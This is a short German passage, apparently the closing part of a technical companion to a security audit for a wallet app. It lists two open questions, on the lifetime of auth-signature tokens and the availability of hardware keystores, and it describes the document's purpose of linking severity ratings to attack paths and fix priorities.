- DFX-Auth-Token-Lifecycle (wie lange gilt eine `personal_sign`-Auth-Signatur serverseitig?).
- Hardware-Backed-Keystore-Verfügbarkeit auf den Devices der RealUnit-User (Telemetrie aus Beta-Phase?).

---

*Dieses Dokument ist die technische Begleitung zum Follow-Up-Audit `docs/security-review-followup.md`. Es ergänzt die dort vergebenen Severity-Ratings um den konkreten Angriffspfad und die daraus folgende Empfehlung der Fix-Priorisierung.*
